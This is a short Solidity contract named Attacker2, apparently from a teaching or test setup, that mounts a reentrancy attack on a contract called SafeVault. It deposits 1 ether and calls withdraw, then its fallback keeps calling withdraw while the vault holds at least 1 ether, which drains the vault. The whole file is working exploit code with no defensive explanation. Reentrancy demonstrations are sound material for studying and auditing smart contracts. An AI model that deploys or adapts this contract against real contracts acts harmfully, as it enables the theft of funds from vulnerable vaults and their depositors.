// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./SafeVault.sol";
contract Attacker2 {
    SafeVault public safeVault;

    constructor(address _safeVaultAddress) {
        safeVault = SafeVault(_safeVaultAddress);
    }

    // Fallback is called when safeVault sends Ether to this contract.
    fallback() external payable {
        if (address(safeVault).balance >= 1 ether) {
            safeVault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        safeVault.deposit{value: 1 ether}();
        safeVault.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}